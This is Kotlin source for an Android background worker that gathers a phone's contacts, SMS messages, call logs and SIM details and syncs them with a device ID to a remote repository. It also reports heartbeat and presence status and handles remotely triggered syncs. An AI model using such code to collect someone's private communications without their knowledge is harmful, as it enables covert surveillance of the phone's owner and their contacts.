package com.boxx.datasync.sync

import android.content.Context
import android.os.Build
import androidx.hilt.work.HiltWorker
import androidx.preference.PreferenceManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.boxx.datasync.domain.model.Device
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject

@HiltWorker
class SyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters,
    private val repository: DataRepository
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceIdHelper.getDeviceId(applicationContext)
        val prefs = PreferenceManager.getDefaultSharedPreferences(applicationContext)

        // Default to incremental sync unless explicitly tagged otherwise (or if it's the first time)
        val isFullSyncRequested = tags.contains("FullSync")
        val isIncremental = !isFullSyncRequested

        val lastSmsSync = if (isIncremental) prefs.getLong("last_sms_sync", 0L) else 0L
        val lastCallSync = if (isIncremental) prefs.getLong("last_call_sync", 0L) else 0L
        val lastContactSync = if (isIncremental) prefs.getLong("last_contact_sync", 0L) else 0L

        android.util.Log.d("Sync", "WORKER_SYNC_STARTED (Incremental=$isIncremental)")

        try {
            if (!hasRequiredPermissions()) {
                android.util.Log.e("Sync", "WORKER_SYNC_FAILED: Missing permissions")
                repository.updateDeviceInfoMap(deviceId, mapOf(
                    "syncStatus" to "Error: Permissions not granted",
                    "lastError" to "Missing required permissions",
                    "heartbeatAt" to System.currentTimeMillis(),
                    "presenceStatus" to "Online"
                ))
                return Result.success() // Do not retry if permissions are missing
            }

            val contacts = DataHelper.fetchContacts(applicationContext, sinceTimestamp = lastContactSync)
            val smsList = DataHelper.fetchSMS(applicationContext, sinceTimestamp = lastSmsSync)
            val callLogs = DataHelper.fetchCallLogs(applicationContext, sinceTimestamp = lastCallSync)

            val totalContacts = DataHelper.fetchContacts(applicationContext, sinceTimestamp = 0).size
            val totalSms = DataHelper.fetchSMS(applicationContext, sinceTimestamp = 0).size
            val totalCalls = DataHelper.fetchCallLogs(applicationContext, sinceTimestamp = 0).size

            val simState = DataHelper.getSimState(applicationContext).toMutableMap()
            simState["contactCount"] = totalContacts
            simState["smsCount"] = totalSms
            simState["callCount"] = totalCalls

            repository.performSync(
                deviceId = deviceId,
                contacts = contacts,
                smsList = smsList,
                callLogs = callLogs,
                simState = simState,
                isFullSync = !isIncremental,
                lastHandledSyncRequest = prefs.getLong("last_handled_sync_request", 0L)
            )

            if (isIncremental) {
                prefs.edit().apply {
                    if (smsList.isNotEmpty()) putLong("last_sms_sync", smsList.maxOf { it.date })
                    if (callLogs.isNotEmpty()) putLong("last_call_sync", callLogs.maxOf { it.date })
                    if (contacts.isNotEmpty()) putLong("last_contact_sync", System.currentTimeMillis())
                }.apply()
            }

            android.util.Log.d("Sync", "WORKER_SYNC_SUCCESS")
            return Result.success()
        } catch (e: Exception) {
            android.util.Log.e("Sync", "WORKER_SYNC_FAILED", e)
            repository.updateDeviceInfoMap(deviceId, mapOf(
                "syncStatus" to "Error: ${e.localizedMessage}",
                "lastError" to (e.localizedMessage ?: "Unknown error"),
                "heartbeatAt" to System.currentTimeMillis(),
                "presenceStatus" to "Online"
            ))
            return if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    private fun hasRequiredPermissions(): Boolean {
        val permissions = arrayOf(
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CALL_LOG
        )
        return permissions.all {
            androidx.core.content.ContextCompat.checkSelfPermission(applicationContext, it) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }
}
